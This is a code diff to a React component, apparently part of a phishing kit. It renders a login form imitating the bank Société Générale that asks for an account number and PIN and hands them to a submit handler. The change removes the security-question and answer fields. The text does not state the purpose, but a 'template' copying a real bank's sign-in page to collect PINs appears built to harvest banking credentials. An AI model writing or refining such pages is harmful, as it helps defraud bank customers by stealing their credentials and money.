@@ -8,9 +8,7 @@ interface SocieteGeneraleAuthTemplateProps {
 export function SocieteGeneraleAuthTemplate({ onSubmit }: SocieteGeneraleAuthTemplateProps) {
   const [formData, setFormData] = useState({
     accountNumber: '',
-    pin: '',
-    securityQuestion: '',
-    securityAnswer: ''
+    pin: ''
   });
   const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
   const [showLoader, setShowLoader] = useState(false);
@@ -118,36 +116,6 @@ export function SocieteGeneraleAuthTemplate({ onSubmit }: SocieteGeneraleAuthTem
                     {showPin ? <EyeOff size={20} /> : <Eye size={20} />}
                   </button>
                 </div>
-              </div>
-
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Question de sécurité
-                </label>
-                <input
-                  type="text"
-                  name="securityQuestion"
-                  value={formData.securityQuestion}
-                  onChange={handleChange}
-                  placeholder="Ex: Nom de votre animal de compagnie"
-                  required
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-yellow-500 focus:border-transparent"
-                />
-              </div>
-
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Réponse
-                </label>
-                <input
-                  type="text"
-                  name="securityAnswer"
-                  value={formData.securityAnswer}
-                  onChange={handleChange}
-                  placeholder="Entrez votre réponse"
-                  required
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-yellow-500 focus:border-transparent"
-                />
               </div>
 
               <button
